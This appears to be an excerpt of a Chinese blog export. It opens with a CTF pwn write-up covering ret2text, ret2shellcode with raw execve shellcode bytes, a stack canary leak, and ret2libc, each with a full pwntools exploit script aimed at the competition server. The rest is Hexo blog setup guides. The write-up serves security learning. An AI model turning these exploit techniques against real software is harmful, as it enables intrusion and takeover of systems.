5.幽幽子的食物\n\nret2text\n\n查看保护：\n\n![checksec](记第一次出Pwn题——AuroraCTF2023第一批Pwn/image-20231023132127507.png)\n\n没有开canary，说明可以直接进行溢出\n\n在IDA反汇编后发现有后门函数\n\n![gift](记第一次出Pwn题——AuroraCTF2023第一批Pwn/image-20231023172115519.png)\n\n主函数：\n\n![main](记第一次出Pwn题——AuroraCTF2023第一批Pwn/image-20231023172129483.png)\n\n在s中可读入0x100大小，肯定能溢出。\n\n双击s查看栈结构：\n\n![stack_of_main](记第一次出Pwn题——AuroraCTF2023第一批Pwn/image-20231023172222483.png)\n\n要进行溢出，需要填充0x30（s的大小） + 0x8（rbp）字节的字符，然后再发送目标后门地址。\n\n![backdoor](记第一次出Pwn题——AuroraCTF2023第一批Pwn/image-20231023172331057.png)\n\n在汇编界面找到后门函数执行system(\"/bin/sh\")的地方，溢出后返回到这里，由于栈对齐的影响返回到gift函数开头可能无法成功getshell，比较保险的方法是直接跳转到这里。\n\n\n\nexp：\n\n```python\n# coding: utf-8\nfrom pwn import *\n\ncontext.arch = 'amd64'\n# sh = process(['./pwn'])\nsh = remote('actf-node.szu.moe', 10077)\n\nbackdoor_addr = 0x4011ac\npayload = b'a' * 0x38 + p64(backdoor_addr)\nsh.sendafter(b'Can you find it?\\n', payload)\n\nsh.interactive()\n```\n\n\n\n## 6.幽幽子的食物2\n\nret2shellcode\n\nshellcode事什么？\n\n> shellcode是一段用于利用软件[漏洞](https://zh.wikipedia.org/wiki/漏洞)而执行的代码，shellcode为16进制之机械码，以其经常让攻击者获得[shell](https://zh.wikipedia.org/wiki/殼層)而得名。shellcode常常使用[机器语言](https://zh.wikipedia.org/wiki/机器语言)编写，由于现代电脑系统基本上启用[NX位元](https://zh.wikipedia.org/wiki/NX位元)保护使得机械码无法直接执行，可透过[返回导向编程](https://zh.wikipedia.org/wiki/返回导向编程)编写shellcode。 可在暂存器eip溢出后，塞入一段可让CPU执行的shellcode机械码，让电脑可以执行攻击者的任意指令。         ——摘自WikiPedia\n\nret2shellcode事什么？\n\n参考ctfwiki：https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/#ret2shellcode\n\n回到本题，让我们先看看这道题的结构\n\n查看保护：\n\n![checksec](记第一次出Pwn题——AuroraCTF2023第一批Pwn/image-20231023173247783.png)\n\n全关了\n\n看IDA反汇编：\n\n![main](记第一次出Pwn题——AuroraCTF2023第一批Pwn/image-20231023173102886.png)\n\n首先输出了buf的地址，然后可以在buf写入最多0x20字节，然后对v5进行read，显然在v5处是可以直接溢出的。\n\n这题没有了后门函数，因此就需要用到前面的buf。\n\n根据上面的简介我们已经了解shellcode可以让机器执行指定的命令从而getshell，在本题而言，由于没有开NX保护，可以直接在buf处写入合适长度的shellcode，然后在后面栈溢出返回到buf处即可。\n\n那么，shellcode怎么获得呢，一般来说，如果没有特殊的限制，直接调用asm(shellcraft.sh())就能直接生成一个可行的shellcode，实际测试发现这个生成的shellcode长度超过了buf的长度，因此可以在下面这个网站中找一个更短的别人生成好的shellcode\n\nhttps://shell-storm.org/shellcode/index.html\n\n对于linux 64位文件，我们应该找的是Linux Intel x86-64列表下的shellcode\n\n这里出题的时候特意让其中的几个shellcode满足条件，可以直接用，如果遇到长度限制更加严格、或者有其他限制的情况，就需要手搓shellcode了。~~这就不是现在探讨的问题了(~~\n\n\n\nexp:\n\n```python\nfrom pwn import *\n\ncontext.log_level = 'debug'\ncontext.arch = 'amd64'\n\n#p = process('./pwn')\np = remote('xxxxxxxx', ?????)\n\nshellcode = '\\x31\\xc0\\x48\\xbb\\xd1\\x9d\\x96\\x91\\xd0\\x8c\\x97\\xff\\x48\\xf7\\xdb\\x53\\x54\\x5f\\x99\\x52\\x57\\x54\\x5e\\xb0\\x3b\\x0f\\x05'\n\np.recvuntil(b'Here is your gift: 0x')\nbuf_addr = int(p.recv(12), 16)\n# 接收buf的地址\n#print(\"buf_addr: \", hex(buf_addr))\np.sendafter(b\"Where do you want to place it?\\n\", shellcode)\n\npayload =   b'a' * 0x38 + p64(buf_addr)\np.sendafter(b'Bye~\\n', payload)\n\np.interactive()\n```\n\n\n\n## 7.StarRail\n\n考点：泄露canary，canary绕过\n\n~~相信了解了ELF文件保护模式的你们一定知道~~ canary保护是检测栈溢出的一种手段，开启之后程序会在栈的某个地方填入canary，并将这个canary保存起来。32位程序中的canary为4字节，64位程序中的canary为8字节，且**最后一个字节为空白字符（\\x00）**。\n\n64位程序canary的位置一般位于rbp-8的位置，在程序返回之前，会先比较栈上canary的值和保存的canary值是否相同，如果不同，说明发生了栈溢出，将会跳转到__stack_chk_fail函数，然后程序就会寄掉。\n\n那要绕过canary保护其实也很简单，首先泄露canary，然后在构造payload的时候，在canary的位置把泄露出来的canary填回去就能绕过检测，正常执行栈溢出。\n\n本题开启了canary保护的栈结构如下图所示：\n\n<img src=\"记第一次出Pwn题——AuroraCTF2023第一批Pwn/image-20231024100618935.png\" alt=\"canary\" style=\"zoom:80%;\" />\n\n那么可以看到其中var_8对应的就是canary。\n\n可以看到有后门函数：\n\n<img src=\"记第一次出Pwn题——AuroraCTF2023第一批Pwn/image-20231024100722147.png\" alt=\"gift\" style=\"zoom:80%;\" />\n\n但是需要用到srcret，那么secret是什么呢，我们可以双击查看\n\n![secret](记第一次出Pwn题——AuroraCTF2023第一批Pwn/image-20231024100812199.png)\n\n可以看到secret是bss段的一个全局变量。\n\n至此思路基本已经清晰了，那就是绕过canary溢出返回到后门函数，并想办法将secret修改成/bin/sh\n\n![main](记第一次出Pwn题——AuroraCTF2023第一批Pwn/image-20231024100929056.png)\n\n在主函数中我们可以看到Login success后会直接将栈上信息整个输出，由于printf字符串会在遇到\\x00截断，因此直接输出是无法泄露canary的。\n\n~~那么如何泄露canary呢，这里留个悬念，剩下的流程看下面的exp可以思考下为什么。不会再来摇我（~~\n\nexp: \n\n```python\nfrom pwn import *\n\ncontext.log_level = 'debug'\n\n#p = process('./pwn')\np = remote('actf-node.szu.moe', 10061)\n\nbackdoor = 0x401207\n\npayload = b'a' * (0x50-8) + b'b'\np.recvuntil(b'Account name: ')\np.send(payload)\np.recvuntil(b'Password: ')\np.send(b'/bin/sh\\x00')\np.recvuntil(b'ab')\ncanary = u64(p.recv(7).rjust(8, b'\\x00'))\nprint(hex(canary))\n\npayload2 = b'a' * (0x30-8) + p64(canary) + b'a' * 8 + p64(backdoor)\np.sendafter(b'To thank for your help, Tokoyomi will give you what you want.', payload2)\np.interactive()\n```\n\n\n\n## 8.TiamaT:F minor\n\n考点：ret2libc\n\n就是一道非常常规的ret2libc，要做出来参考其他ret2libc题目的解法解这道题就行，异曲同工。\n\n**注意一点：在本地调试的时候要将给出的libc(如果有的话)先patch了。**\n\n\n\nexp:\n\n```python\nfrom pwn import *\n\ncontext.log_level = 'debug'\ncontext.arch = 'amd64'\n\np = remote('actf-node.szu.moe', ?????)\n\nelf = ELF('./pwn')\nlibc = ELF('./libc.so.6')\n\n\npop_rdi_ret = 0x400743\nputs_plt = elf.plt['puts']\nputs_got = elf.got['puts']\nmain_addr =  elf.symbols['main']\n\npayload = b'a' * 0x38 + p64(pop_rdi_ret) +  p64(puts_got)  + p64(puts_plt) + p64(main_addr)\np.recvuntil(b'Show me your power!\\n')\np.send(payload)\n\nputs_addr = u64(p.recv(6).ljust(8, b'\\x00'))\nprint(hex(puts_addr))\nlibc_base = puts_addr - libc.symbols['puts']\nprint(hex(libc_base))\nsystem_addr = libc_base + libc.symbols['system']\nbin_sh_addr = libc_base + libc.search(b'/bin/sh').__next__()\n\nret = 0x4006d3\npayload2 = b'a' * 0x38 + p64(ret) + p64(pop_rdi_ret) + p64(bin_sh_addr) + p64(system_addr)\np.recvuntil(b'Show me your power!\\n')\np.send(payload2)\n\np.interactive()\n```\n\n\n\n## Pwndbg调试\n\npwndbg是做pwn题离不开的一个十分重要的工具，熟练应用pwndbg调试程序是你能成功getshell的一个重要保障。\n\npwndbg基本操作指令：这方面的介绍很多，根据需要自行搜索了解。下面放个例子\n\n<a href=\"https://www.cnblogs.com/murkuo/p/15965270.html\" target=\"_blank\">pwndbg基本操作</a>\n\ngdb.attach()：在pwntools脚本中调用gdb调试，通过传入gdb脚本可以让程序断点在指定位置。\n\n~~注意：gdb调试只能在打本地的时候用，打远程请务必注释掉gdb调试，否则会报错!~~\n\n例如:\n\n```python\np = process('./pwn')\ngdb.attach(p, 'b *0x401124')\n```\n\n注意地址要是十六进制的，前面要加*\n\n如果是开了pie保护的程序，使用gdb.attach()的方式如下\n\n```python\ngdb.attach(p, 'b *$rebase(0x1124)')\n```\n\n\n\n\n\n","tags":["pwn"],"categories":["CTF","pwn"]},{"title":"hexo添加版权声明","url":"/2023/10/30/hexo添加版权声明/","content":"\n# hexo添加版权声明\n\n<!-- toc -->\n\n由于主题的问题，这里采用手动配置的方法，添加版权声明的位置为**文章末尾**。\n\n### 1.修改主题目录下的  **<u>layout/_partial/article.ejs</u>**  模板文件\n\n在下面的位置添加代码，在我的主题里面这是在文章对应部分的最后，footer前面：\n\n```ejs\n\t <%- post.content %>\n<% } %>\n<!--   在此处添加代码  -->\n</div>\n\t<footer class=\"article-footer\">\n```\n\n添加的内容如下：\n\n```ejs\n<!-- 添加版权声明 -->\n    <%\n    var sUrl = url.replace(/index\\.html$/, '');\n    sUrl = /^(http:|https:)\\/\\//.test(sUrl) ? sUrl : 'https:' + sUrl;\n  %>\n  <% if ((theme.declare_type === 2 || (theme.declare_type === 1 && post.declare)) && !index){ %>\n    <div id=\"declare\">\n      <strong>本文作者：</strong>\n      <% if(config.author != undefined){ %>\n        <%= config.author%>\n      <% }else{%>\n        <font color=\"red\">请在博客根目录“_config.yml”中填入正确的“author”</font>\n      <%}%>\n      <br>\n      <strong>本文链接：</strong>\n      <a href=\"<%= config.url %>/<%= post.path %>\" title=\"<%= post.title %>\" target=\"_blank\"><%= config.url %>/<%= post.path %></a>\n      <br>\n      <strong>版权声明：</strong>\n      除特殊说明外，本作品采用\n    <a id=\"copyright\" href=\"http://creativecommons.org/licenses/by-nc-sa/4.0/?ref=chooser-v1\" target=\"_blank\" rel=\"license noopener noreferrer\" style=\"display:inline-block;\">CC BY-NC-SA 4.0</a>\n        协议进行许可。转载请注明出处！\n    </div>\n  <% } else {%>\n    <div class=\"declare\" hidden=\"hidden\"></div>\n  <% } %>\n<!-- 添加版权声明 -->\n```\n\n这段代码作用就是使版权声明显示在html页面中文章末尾的地方。\n\n### 2.添加对应的CSS样式\n\n打开主题目录下：`source/css/_partial/article.styl`文件\n\n添加如下css样式：\n\n```css\n/*版权声明的样式*/\n#declare {\n  background-color: #eaeaea;\n  margin-top: 2em;\n  margin-bottom: 2.5em;\n  border-left: 3px solid #ff1700;\n  padding: .5em 1em; \n  line-height: 2em;\n}\n```\n\n### 3.修改主题配置文件\n\n`themes/themename/_config.yml`\n\n添加如下内容：\n\n```yaml\n# 版权声明\n#在需要进行版权声明的文章的md文件头部，设置属性declare: true。\n#版权基础设定：0-关闭声明； 1-文章对应的md文件里有declare: true属性，才有版权声明； 2-所有文章均有版权声明\ndeclare_type: 1\n```\n\n\n\n#### 添加后的页面显示效果如下\n\n![BYNCSA](hexo添加版权声明/image-20231030195531220.png)\n","tags":["hexo"],"categories":["hexo"]},{"title":"hexo主题配置--reimu","url":"/2023/10/29/hexo主题配置-reimu/","content":"\n# hexo主题配置--reimu\n\n本文配置过程主要参考主题开发者的博客：https://d-sketon.github.io/20230707/hexo-theme-reimu-guide/\n\n<!-- toc -->\n\n## 结构\n\n```text\n.\n├── _screenshot 截图\n├── _example    示例source文件夹内结构\n├── _config.yml 主题配置\n├── languages\n├── layout\n├── scripts\n└── source\n```\n\n## 安装\n\n使用npm\n\n```shell\nnpm install hexo-theme-reimu --save\n```\n\n或直接克隆[本仓库](https://github.com/D-Sketon/hexo-theme-reimu)至`/themes`文件夹下并重命名为`reimu`\n\n```shell\ngit clone https://github.com/D-Sketon/hexo-theme-reimu.git\n```\n\n并修改 `_config.yml` 中的theme\n\n```yaml\n# Extensions\n## Plugins: https://hexo.io/plugins/\n## Themes: https://hexo.io/themes/\ntheme: reimu\n```\n\n为了后面操作的方便，建议是直接克隆主题仓库到本地。\n\n\n\n## 使用\n\n###  基本结构\n\n为了保证显示正确，请参考 `_example` 在 `_source` 中分别建立 `_data`、`about` 和 `friend` 文件夹\n\n####  _data\n\n- `avatar` 文件夹中存储作者头像，默认命名 `avatar.jpg`，可在 内层 `_config.yml` 中做如下配置\n\n```yaml\navatar: \"avatar.jpg\"\n```\n\n- `covers` 文件夹中存储文章封面\n- `covers.yml` 中存储文章封面url\n\n####  about\n\n`index.md` 作为**关于**页面\n\n####  friend\n\n`index.md` 作为**友链**页面，在 `_data.yml` 中填入友链信息即可在页面上显示对应好友卡片\n\n\n\n### 封面、头图和图标\n\n####  封面\n\n封面显示逻辑如下\n\n- 如果文章的Front matter中包含cover的url，则该文章头图和首页缩略图均显示该url\n\n```yaml\n---\ntitle: Hello World\ncover: https://example.com\n---\n```\n\n- 如果文章的Front matter中包含cover为`false`，则该文章不显示头图（首页上仍然是随机图片）\n\n```yaml\n---\ntitle: Hello World\ncover: false\n---\n```\n\n- 如果文章的Front matter中包含cover为`rgb(xxx,xxx,xxx)`，则该文章头图为对应的渐变纯色（首页上仍然是随机图片）\n\n```yaml\n---\ntitle: Hello World\ncover: rgb(255,117,117)\n---\n```\n\n- 否则查找 `covers` 文件夹和 `covers.yml`，并从中随机挑选图片\n- 若上述文件均不存在，则显示头图\n\n####  头图\n\n头图保存于 `themes/reimu/source/images/banner.jpg`，可在内层 `_config.yml`中修改\n\n```yaml\nbanner: \"/images/banner.jpg\"\n```\n\n####  图标\n\n图标保存于 `themes/reimu/source/images/favicon.ico`，可在内层 `_config.yml`中修改\n\n```yaml\nfavicon: \"/images/favicon.ico\"\n```\n\n####  置顶\n\n在文章的Front-matter中添加 `sticky: true`\n\n```yaml\n---\ntitle: Hello World\nsticky: true\n---\n```\n\n###  代码高亮\n\n为保证代码块的正确显示，请保证外层 `_config.yml` 中为如下配置\n\n```yaml\nhighlight:\n  enable: true\n  wrap: true\n  hljs: false\nprismjs:\n  enable: false\n```\n\n### 站内搜索\n\n#### 使用Algolia\n\n站内搜索基于 [Algolia](https://www.algolia.com/)，首先安装 [hexo-algolia](https://github.com/thom4parisot/hexo-algolia)\n\n```shell\nnpm install hexo-algolia --save\n```\n\n参考其 [README](https://github.com/thom4parisot/hexo-algolia#readme) 和 [为Hexo增加algolia搜索功能](https://blog.csdn.net/qq_35479468/article/details/107335663) 完成对 `Algolia` 账号的配置，配置过程如下：\n\n1、创建app\n\n* **登录[https://www.algolia.com/](https://link.zhihu.com/?target=https%3A//www.algolia.com/users/sign_in%EF%BC%8C%E5%8F%AF%E4%BB%A5%E9%80%9A%E8%BF%87github%E5%92%8CGoogle%E8%B4%A6%E5%8F%B7%E7%99%BB%E5%BD%95)**，可以通过github和Google账号登录\n\n* 登录后找到Settings→Applications→Create Application新建一个app\n\n* 进入刚刚新建的app中，在设置里找到API keys就可以看到相关信息\n\n  ![api-keys](hexo主题配置-reimu/image-20231029221442121.png)\n\n2、创建索引\n\n* 同样进入刚刚新建的app，点开左下角的Data sources→Indices→Create Index创建索引\n\n  ![index](hexo主题配置-reimu/image-20231029221742274.png)\n\n在外层 `_confg.yml` 中添加如下配置\n\n```yaml\n# algolia search\nalgolia:\n  applicationID: 'Your ApplicationID'\n  apiKey: 'Your Apikey'\n  adminApiKey: 'Your Admin API key'\n  indexName: 'Your IndexName'\n  chunkSize: 5000\n  fields:\n    - title\n    - content\n    - url\n    - tags\n    - categories\n\nsearch:\n  path: search.xml\n  field: all\n```\n\n其中apikey为上面的Search-Only API Key，indexName为上面创建的索引名。\n\nfields为指定搜索的范围。\n\n在内层 `_config_yml`（即克隆下来的themes文件夹里面的那个） 中将 `algolia_search.enable` 改为 `true`，\n\n```yaml\nalgolia_search: enable: true\n```\n\n内层中关于algolia的设置如下：\n\n```shell\n# need https://github.com/thom4parisot/hexo-algolia\n# please add the following config in your _config.yml\n# algolia:\n#   applicationID: 'your applicationID'\n#   apiKey: 'your apiKey'\n#   adminApiKey: 'your adminApiKey'\n#   indexName: 'your indexName'\n#   chunkSize: 5000\nalgolia_search:\n  enable: true\n  hits:\n    per_page: 10\n  labels:\n    input_placeholder: \"搜索.....\"\n    hits_empty: \"未发现与 「${query}」相关内容\"\n    hits_stats: \"找到${hits}条结果（用时 ${time} ms）\"\n```\n\n注意：hexo-algolia搜索跳转链接为永久链接，所以请保证外层 `_config.yml` 中的 `url` 填写正确\n\n\n\n3、部署上algolia，需要将文件的索引上传到algolia，这样才能搜索的到文章标题\n\n```text\nhexo g   \nhexo algolia\n```\n\n如果出现报错，则添加HEXO_ALGOLIA_INDEXING_KEY=API Key（你创建app的adminApiKey）\n\n> 这里需要注意的是，Admin API Key 是一个**非常重要**的密钥，不应该将其暴露在公开的仓库中，因此需要将其添加到环境变量中，而不是直接写在配置文件中。\n\n```text\nexport HEXO_ALGOLIA_INDEXING_KEY=API Key  \nhexo algolia\n```\n\n在Windows系统下，需要手动将其添加到系统环境变量中，要注意的是Windows的系统环境变量修改后需要重启才能生效。\n\n> 此部分相关参考材料：\n>\n> <a href=\"https://werty.cn/2019/08/hexo/hexo%20algolia%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%A4%B1%E8%B4%A5%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/\" target=\"_blank\">hexo algolia 常见问题解决办法</a>\n>\n> <a href=\"https://zhuanlan.zhihu.com/p/606083588\" target=\"_blank\">hexo&github 搭建博客</a>\n>\n> <a href=\"https://blog.csdn.net/mulianju/article/details/129550258\" target=\"_blank\">HEXO博客系统添加搜索功能</a>\n\n\n\n#### 使用 hexo-generator-search\n\n安装 hexo-generator-search：\n\n```shell\nnpm install hexo-generator-search\n```\n\n在外层`_config.yaml`中添加如下配置：\n\n```yaml\nsearch:\n  path: search.json # 文件名必须为search.json\n  field: post\n  content: true\n```\n\n在内层`_config.yaml`中将`generator_search.enable`改为`true`\n\n```yaml\ngenerator_search:\n  enable: true\n```\n\n\n\n### 数学公式\n\n数学公式基于 [Katex](https://github.com/KaTeX/KaTeX)，请安装 [hexo-renderer-markdown-it-plus](https://github.com/CHENXCHEN/hexo-renderer-markdown-it-plus)\n\n```shell\nnpm uninstall hexo-renderer-marked --save\nnpm install hexo-renderer-markdown-it-plus --save\n```\n\n在内层 `_config_yml` 中将 `math.enable` 改为 `true`\n\n```yaml\nmath:\n  enable: true\n```\n\n###  Mermaid\n\n本功能为展示侧边栏中的标签云\n\n请安装 [hexo-filter-mermaid-diagrams](https://github.com/webappdevelp/hexo-filter-mermaid-diagrams)\n\n```shell\nnpm install hexo-filter-mermaid-diagrams --save\n```\n\n在内层 `_config_yml` 中将 `mermaid.enable` 改为 `true`\n\n```yaml\nmermaid:\n  enable: true\n```\n\n\n\n### RSS\n\n请安装 [hexo-generator-feed](https://github.com/hexojs/hexo-generator-feed)\n\n```yaml\nnpm install hexo-generator-feed --save\n```\n\n并参考其 [README](https://github.com/hexojs/hexo-generator-feed#readme) 在外层 `_config.yml` 完成对 `feed` 的配置\n在内层 `_config.yml` 中填入生成的 `xml`\n\n```yaml\nrss: atom.xml\n```\n","tags":["hexo","algolia"],"categories":["hexo"]},{"title":"hexo博客搭建记录","url":"/2023/10/29/hexo博客搭建记录/","content":"\n# hexo博客搭建记录\n\n目录跳转：\n\n<!-- toc -->\n\n花了一下午把hexo博客搭好了，这里简单记录一下搭建的过程。\n\n> 本文的安装过程主要参考这位dalao的博客：`https://hasegawaazusa.github.io/hexo-note.html`\n\n## 搭建hexo博客\n\n### 1.前置环境\n\n* **Git**\n\n  由于博客是搭在git上的，因此需要绑定好 Github 的账号与邮箱，并能够建立连接\n\n  具体操作请参考：<a href=\"https://t3uk1.github.io/2023/10/29/Git的绑定与连接\" target=\"_blank\">Git的绑定与连接</a>\n\n* **Node.js**\n\n\n\n### 2.安装hexo\n\n```shell\nnpm install -g hexo-cli\t\t# npm 安装 hexo\n```\n\n\n\n### 3.初始化hexo\n\n```shell\nhexo init blog\t\t\t\t# 初始化 hexo\n```\n\n其中，***blog*** 为博客的根目录，其名称可以自定义。\n\n```shell\ncd blog\t\t\t\t\t\t# 切换到博客根目录\nnpm install\t\t\t\t\t# 自动化安装依赖文件，完成 hexo 初始化\n```\n\n\n\n### 4.hexo生成静态网页文件\n\n```shell\nhexo generate\t\t\t\t# 自动化生成静态网页文件\n```\n\n该命令可以简写为\n```shell\nhexo g\n```\n\n\n\n### 5.开启hexo服务\n\n```shell\nhexo server\t\t\t\t\t# 开启服务\n```\n\n开启hexo服务后，即可通过本地访问 blog 页面（默认为 `localhost:4000` ）预览博客页面。\n\n相关参数：\n\n```shell\nhexo s\t\t\t\t\t\t# 简化指令\nhexo s -s\t\t\t\t\t# 静态模式\nhexo s -p 5000\t\t\t\t# 更改端口\nhexo s -i 192.168.1.5\t\t# 自定义ip\n```\n\n\n\n### 6.部署博客\n\n这里使用Github仓库进行部署。\n\n首先在Github创建一个名为  `<username>.github.io`的仓库，例如我的就是`t3uk1.github.io`。\n\n在博客根目录下安装 `hexo-deployer-git` 部署插件\n\n```shell\nnpm install hexo-deployer-git --save\n```\n\n更改 hexo 站点配置文件 (`~/_config.yml`) 中的 Deployment配置项\n\n以我为例更改的配置项结果为\n\n```yaml\ndeploy:\n  type: git\n  repo: git@github.com:t3uk1/t3uk1.github.io.git\n```\n\n> 上面`repo` 使用 ssh 链接的原因：我的 git 使用 ssh 与 github 进行远程连接\n>\n> 如果git 使用 https 与 github 进行远程连接请使用 https 链接\n\n在**博客根目录**下，输入部署指令\n\n```\nhexo deploy\t\t\t\t\t# 部署指令\n```\n\n简化指令：\n\n```shell\nhexo d\n```\n\n一键部署指令：\n\n```shell\nhexo clean && hexo g -d\n# clean 用于清除本地缓存\n# g自动化生成\n# -d部署\n```\n\n等待一段时间后，可以通过 `https://<username>.github.io` 访问自己的博客。\n\n例如我的链接就是：<a href=\"https://t3uk1.github.io/\">https://t3uk1.github.io</a></a>\n\n\n\n## hexo入门操作\n\n### 1.hexo更新\n\n```shell\nnpm update -g hexo-cli\t\t# 使用 npm 更新 hexo\n```\n\n### 2.hexo 新建博文\n\n```shell\nhexo new hello\t\t\t\t# 新建博文\n```\n\n> **hello**可自由更改，对应生成的md文件名\n\n可选的额外选项：\n\n```shell\nhexo n hello\t\t\t\t# 简化指令\nhexo n post hello\t\t\t# 新编博文并立即发布。默认 ~/source/_posts/hello.md\nhexo n draft hello\t\t\t# 新编博文但暂不发布。默认 ~/source/_drafts/hello.md\nhexo n page hello\t\t\t# 新建页面（标签页，分类页等）。默认 ~/source/hello\n```\n\n然后进入 `~/source/_posts/` 找到 `hello.md` ，打开文件，内容如下\n\n```head\ntitle: hello\ndate: 1970-1-1 8:00:00\ntags: [hello, demo]\n```\n\n该头为 `Front-matter` ，参数如下：\n\n- **`title`** → 博文标题\n- **`date`** → 发布日期，默认为文件创建日期\n- **`tags`** → 博文标签\n\n修改后，在正文处输入内容即可编辑博文内容。`.md`格式文本示例如下：\n\n```markdown\n---\ntitle: hello\ndate: 1970-1-1 8:00:00\ntags: [hello, demo]\n---\n# First Blog\nThis is my **first** blog!\n```\n\n### 3.hexo 主题\n\n进入 https://hexo.io/themes/ 进行挑选合适的主题\n\n这里以配置 `NexT` 主题为例：\n\n打开 `Powershell` 输入以下命令，安装 `NexT` 主题\n\n```shell\nnpm install hexo-theme-next --save\n```\n\n更改 hexo 站点配置文件 (`~/_config.yml`) 中的Extensions配置项\n\n```shell\ntheme: next\n```\n\n重新进行网页生成即可\n\n```shell\nhexo clean\t\t\t\t\t# 清除缓存\nhexo g -d\t\t\t\t\t# 重新生成并部署\n```\n\n本博客使用了另一个主题，配置与NexT有些不一样，详情请看：<a href=\"https://t3uk1.github.io/2023/10/29/hexo主题配置-reimu\" target=\"_blank\">hexo主题配置-reimu</a>\n\n\n\n### 4.hexo 博文插入超链接\n\n对于站外的超链接，直接将外站的完整链接贴入括号内即可 (`[value](link)`)，例如\n\n```markdown\n点击[这里](https://t3uk1.github.io/)进入博客\n```\n\n效果如下\n\n> 点击[这里](https://t3uk1.github.io/)进入博客\n\n如果要使跳转后的页面在新页面中打开而不是在当前页面打开，可以直接使用html标签的形式实现：\n\n```html\n<a href=\"https://t3uk1.github.io/\" target=\"_blank\">这里</a>\n```\n\n效果如下：\n\n> 点击<a href=\"https://t3uk1.github.io/\" target=\"_blank\">这里</a>在新页面打开博客\n\n\n\n### 5.hexo 博文插入图片\n\n更改博客根目录下配置文件`~/_config.yml`中相关属性：\n\n```yaml\npost_asset_folder: true\nmarked:\n  prependRoot: true\n  postAsset: true\n```\n\n在**博客根目录**下安装**`hexo-asset-image`**插件\n\n```shell\nnpm install hexo-asset-image --save\n```\n\n将相关图片资源放进对应文件夹并直接使用文件夹内的资源即可。\n\n**修改插件**：\n\n在装好插件更新博客之后，发现图片加载不出来，查看网页中图片的路径的时候发现路径有点不对劲，一查发现是插件有bug，需要修改插件才能使图片路径正常。\n\n- 进入博客的根目录，然后下面顺序找到`index.js`:\n  `node_modules` --> `hexo-asset-image` --> `index.js`\n\n- 用VS Code 或者 记事本打开 `index.js`\n\n- 在第 58 行，可以找到这么一行代码：\n\n  ```js\n  $(this).attr('src', config.root + link + src);\n  ```\n\n- 将其改为:\n\n  ```js\n  $(this).attr('src', src);\n  ```\n\n- 保存文件\n\n\n\n使用typora可以比较方便的实现图片的引用，具体操作如下：\n\n偏好设置→图像，插入图片选项选择复制到指定路径，下面勾选和下图一样，保存。\n\n![image](hexo博客搭建记录/image-20231029223951514.png)\n\n这样设置之后，当执行\n\n```shell\nhexo new 'file'\n```\n\n的时候，会顺带创建一个与md文件同名的文件夹，当 `Typora` 插入图片时，会自动将图片资源复制进入 hexo 可以检索的 asset 文件夹。\n\n\n\n### 6.hexo 添加标签页\n\n在博客根目录下：\n\n```shell\nhexo new page tags\n```\n\n在 Front-matter 中添加：\n\n```shell\ntype: tags\n```\n\n完成后 hexo 便会自动生成标签页\n\n![tags](hexo博客搭建记录/image-20231029224453329.png)\n\n\n\n### 7.其他页面的添加\n\n由于我现在用的主题里面关于页面、友链和404等已经添加好了，如果要手动添加的请参考其他dalao的博客。\n\n如果需要其他自定义页面，可以使用 `layout` 参数\n\n\n\n### 8.页内跳转目录的设置\n\n安装toc插件\n\n```shell\nnpm install hexo-toc --save\n```\n\n在根目录下配置文件中添加关于toc的设置：\n\n```yaml\ntoc:\n  mindepth: 2\n  maxdepth: 3\n  class: toc\n  slugify: transliteration\n  decodeEntities: false\n  anchor:\n    position: after\n    symbol: ''\n    style: header-anchor\n```\n\nmindepth表示最低搜索深度，maxdepth表示最大搜索深度，搜索深度对应文章标题等级(h1-h...)，如上面的就是只显示h2标题到h3标题的目录。\n\n在markdown文件中使用toc插件：\n\n只需要在需要插入导航的地方加一句\n\n```markdown\n<!-- toc -->\n```\n\n就能自动创建能够实现页内跳转的目录。\n\n> 关于toc插件详情请参考: `https://github.com/bubkoo/hexo-toc`\n\n\n\n## hexo 配置详解\n\n### hexo 博文头 - Front-matter\n\n| 参数              | 意义                                                         | 默认值                                                       |\n| :---------------- | :----------------------------------------------------------- | :----------------------------------------------------------- |\n| `layout`          | 排版                                                         | [`config.default_layout`](https://hexo.io/docs/configuration#Writing) |\n| `title`           | 标题                                                         | 文件名                                                       |\n| `date`            | 发布日期                                                     | 文件创建日期                                                 |\n| `updated`         | 更新日期                                                     | 文件更新日期                                                 |\n| `comments`        | 简介                                                         | `true`                                                       |\n| `tags`            | 标签                                                         |                                                              |\n| `categories`      | 分类                                                         |                                                              |\n| `permalink`       | 永久链接的相对路径 (如`/index.html`)                         | `null`                                                       |\n| `excerpt`         | 纯文本摘录 (需要使用插件[Post-Excerpt](https://hexo.io/docs/tag-plugins#Post-Excerpt)) |                                                              |\n| `disableNunjucks` | 是否禁用 Nunjucks 的宏 (`{{ }}` / `{% %}`) 和 [tag plugins](https://hexo.io/docs/tag-plugins) 插件 | `false`                                                      |\n| `lang`            | 指定语言                                                     | `_config.yml`                                                |\n\n### hexo 站点配置文件详解\n\n即 `~/_config.yml` 参数详解\n\n#### 网站 - Site\n\n- `title` → 博客标题\n\n```\n# Site\ntitle: Hexo\nsubtitle: ''\t\t\t\t# 博客副标题\ndescription: ''\t\t\t\t# 博客描述 (与搜索引擎的收录有关)\nkeywords:\t\t\t\t\t# 博客关键字，支持多个关键字 (与搜索引擎的收录有关)\nauthor: John Doe\t\t\t# 博客作者名\nlanguage: en\t\t\t\t# 博客使用的语言 (可设置为zh-Hans或zh-CN以支持中文)\ntimezone: ''\t\t\t\t# 博客时区 (默认使用电脑时区)\n```\n\n#### 网址 - URL\n\n```\n# URL\n## Set your site url here. For example, if you use GitHub Page, set url as 'https://username.github.io/project'\nurl: http://example.com\t\t\t\t\t\t# 博客网址，必须以 http:// 或 https:// 开头\npermalink: :year/:month/:day/:title/\t\t# 文章连接生成规则\npermalink_defaults:\npretty_urls:\n  trailing_index: true # Set to false to remove trailing 'index.html' from permalinks\n  trailing_html: true # Set to false to remove trailing '.html' from permalinks\n```\n\n> 一般只需要修改**`url`**\n\n#### 目录 - Directory\n\n```\n# Directory\nsource_dir: source\t\t\t# 资源文件夹，这个文件夹用来存放内容。\npublic_dir: public\t\t\t# 公共文件夹，这个文件夹用于存放生成的站点文件。\ntag_dir: tags\t\t\t\t# 标签文件夹。\narchive_dir: archives\t\t# 归档文件夹。\ncategory_dir: categories\t# 分类文件夹。\ncode_dir: downloads/code\t# Include code 文件夹， source_dir 下的子目录。\ni18n_dir: 